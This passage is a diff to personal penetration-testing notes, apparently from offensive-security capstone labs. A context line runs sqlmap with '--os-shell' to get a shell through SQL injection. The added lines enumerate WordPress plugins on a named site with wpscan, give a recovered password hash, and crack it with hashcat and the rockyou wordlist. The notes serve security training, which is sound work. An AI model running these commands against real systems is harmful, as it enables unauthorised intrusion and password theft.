@@ -200,6 +200,29 @@ Next, we can invoke sqlmap with the -r parameter, using our file containing the 
 sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
 
 
+capstones
+wordpress vulnerable plugins (Note -- this did not catch perfect-survey 1.5.1 which has a SQLI POC on exploitdb and wpscan itself... This option should be skipped?)
+wpscan -e vp --url alvida-eatery.org
+
+wordpress all plugins
+wpscan -e ap --url alvida-eatery.org
+
+
+Hashcat find examples of hash types
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+Found value=\"$P$BINTaLa8QLMqeXbQtzT2Qfizm2P\/nI0\"
+from that the actual hash is
+
+$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0 (the two \'s were escape characters)
+
+hashcat -O -m 400 -a 0 -o cracked.txt hash.txt rockyou.txt
+
+note rockyou.txt is generally zipped
+tar -xsvf rockyou.txt.tar.gz
+
+
+
 
 
 
